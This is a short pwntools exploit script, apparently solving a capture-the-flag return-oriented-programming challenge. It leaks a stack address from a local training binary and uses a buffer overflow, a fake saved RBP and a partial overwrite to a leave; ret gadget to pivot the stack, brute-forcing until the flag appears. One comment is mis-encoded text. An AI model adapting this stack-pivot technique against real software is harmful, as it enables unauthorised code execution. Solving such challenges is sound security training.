from pwn import *
while True:
    # context.terminal = ['tmux', 'splitw', '-h']
    # p = gdb.debug("/challenge/babyrop_level12.0", gdbscript="source /opt/gef/gef.py")
    p = process("/challenge/babyrop_level12.0")
    leave_ret = 0x12D2FA #µÃÓÃlibcµÄ
    p.recvuntil("located at: ")
    leak = int(p.recvuntil(".")[:-1], 16)
    fake_rbp = leak - 0x10
    buf = b"A" * 0x88 
    payload = buf + p64(fake_rbp) + leave_ret.to_bytes(3, "little")
    p.send(payload)
    all = p.recvall()
    if b"pwn" in all:
        print(all)
        break
    p.close()